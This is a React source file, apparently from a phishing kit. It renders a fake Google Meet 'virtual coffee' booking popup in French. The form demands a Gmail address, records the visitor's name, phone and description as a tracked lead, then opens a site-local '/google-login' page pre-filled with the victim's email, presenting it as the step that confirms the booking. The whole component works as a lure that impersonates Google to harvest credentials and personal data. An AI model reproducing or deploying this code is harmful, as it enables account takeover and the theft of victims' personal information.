import React, { useEffect, useState } from 'react';
import { useLeadTracker } from '../hooks/useLeadTracker';
import styles from '../styles/Popup.module.css';

const BookingPopup = ({ showPopup, onClose, campaignData }) => {
  const [emailError, setEmailError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  
  // Hook pour le tracking des leads
  const { trackBooking, isTracking } = useLeadTracker();

  const handlePopupClick = (e) => {
    // Empêcher la propagation de l'événement click pour éviter de fermer/rouvrir la popup
    e.stopPropagation();
  };

  const validateGmailAddress = (email) => {
    const emailRegex = /^[^\s@]+@gmail\.com$/i;
    return emailRegex.test(email);
  };

  const handleEmailChange = (e) => {
    const email = e.target.value;
    if (email && !validateGmailAddress(email)) {
      setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
    } else {
      setEmailError('');
    }
  };

  const handleFormSubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const email = formData.get('email');
    const firstName = formData.get('firstName');
    const lastName = formData.get('lastName');
    const phone = formData.get('phone');
    const description = formData.get('description');
    
    if (!validateGmailAddress(email)) {
      // setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      // Tracker le booking avant de procéder
      await trackBooking({
        email,
        firstName,
        lastName,
        phone,
        description
      });
      
      // Afficher l'état de confirmation
      setShowConfirmation(true);
      
      // Rediriger après 3 secondes
      setTimeout(() => {
        // Ouvrir la page de login Google dans un nouvel onglet avec l'email et le prénom
        window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
        
        // Garder l'état de confirmation (ne pas fermer)
        // setIsSubmitting(false);
        // setShowConfirmation(false);
      }, 3000);
      
    } catch (error) {
      console.error('Erreur lors du tracking du booking:', error);
      // Continuer même si le tracking échoue
      setShowConfirmation(true);
      
      setTimeout(() => {
        window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
      }, 3000);
    }
  };

  // Désactiver le scroll quand la popup est ouverte
  useEffect(() => {
    if (showPopup) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }

    // Nettoyer au démontage du composant
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [showPopup]);

  if (!showPopup) return null;

  return (
    <div className={styles.popupOverlay} onClick={handlePopupClick} data-popup="true">
      <div className={styles.popupContainer}>
        {showConfirmation ? (
          // État de confirmation
          <div className={styles.confirmationSection}>
            <div className={styles.confirmationHeader}>
              <div className={styles.checkIcon}>
                <div className={styles.spinner}></div>
              </div>
              <h2 className={styles.confirmationTitle}>Confirmez votre réservation</h2>
              <p className={styles.confirmationText}>
                Utilisez l'invite de connexion Google pour confirmer votre réservation.
              </p>
              <p className={styles.confirmationSubtext}>
                Un nouvel onglet va s'ouvrir automatiquement...
              </p>
            </div>
          </div>
        ) : (
          // Formulaire normal
          <>
            <div className={styles.popupHeader}>
              <h2 className={styles.title}>Échange / Café virtuel</h2>
              <div className={styles.dateTime}>
                <div>Réunion Google Meet • 15 minutes</div>
                <div className={styles.timezone}>(GMT+02:00) Heure d'Europe centrale - Paris</div>
                {campaignData && (
                  <div className={styles.eventHost}>
                    {campaignData.firstName} {campaignData.lastName} • {campaignData.email}
                  </div>
                )}
              </div>
              <button className={styles.closeBtn} onClick={onClose}>
                ×
              </button>
            </div>

            <div className={styles.meetInfo}>
              <img 
                src="https://ssl.gstatic.com/calendar/images/conferenceproviders/logo_meet_2020q4_192px.svg" 
                alt="Google Meet" 
                width="20" 
                height="20" 
                className={styles.meetIcon}
              />
              <div>Informations de visioconférence Google Meet ajoutées après la réservation</div>
            </div>

            <div className={styles.formSection}>
              <div className={styles.contactHeader}>
                <svg 
                  focusable="false" 
                  width="20" 
                  height="20" 
                  viewBox="0 0 24 24" 
                  className={styles.contactIcon}
                >
                  <path d="M22 3H2C.9 3 0 3.9 0 5v14c0 1.1.9 2 2 2h20c1.1 0 1.99-.9 1.99-2L24 5c0-1.1-.9-2-2-2zm0 16H2V5h20v14z"></path>
                  <path d="M21 6h-7v5h7V6zm-1 2l-2.5 1.25L15 8V7l2.5 1.25L20 7v1zM9 12c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm6 7.75c0-1.99-4-3-6-3s-6 1.01-6 3V18h12v-2.25zM13 16H5v-.09c.48-.5 2.51-1.16 4-1.16s3.52.66 4 1.16V16z"></path>
                </svg>
                <h3>Informations de contact</h3>
              </div>

              <form className={styles.form} onSubmit={handleFormSubmit}>
                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Prénom</label>
                    <input type="text" name="firstName" className={styles.input} required />
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Nom de famille</label>
                    <input type="text" name="lastName" className={styles.input} required />
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Adresse Gmail</label>
                    <input 
                      type="email" 
                      name="email"
                      className={`${styles.input} ${emailError ? styles.inputError : ''}`}
                      onChange={handleEmailChange}
                      placeholder="votre.nom@gmail.com"
                      required 
                    />
                    {emailError && <div className={styles.errorMessage}>{emailError}</div>}
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Numéro de téléphone</label>
                    <input type="tel" name="phone" className={styles.input} />
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Présentez-vous en quelques mots</label>
                    <textarea name="description" className={styles.textarea} rows="3"></textarea>
                  </div>
                </div>

                <div className={styles.formActions}>
                  <button type="button" onClick={onClose} className={styles.cancelBtn} disabled={isSubmitting}>
                    Annuler
                  </button>
                  <button type="submit" className={styles.bookBtn} disabled={isSubmitting || isTracking}>
                    {(isSubmitting || isTracking) ? (
                      <div className={styles.loadingContainer}>
                        <div className={styles.spinner}></div>
                        <span>{isTracking ? 'Réservation...' : 'Vérification en cours...'}</span>
                      </div>
                    ) : (
                      'Réserver'
                    )}
                  </button>
                </div>
              </form>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default BookingPopup;
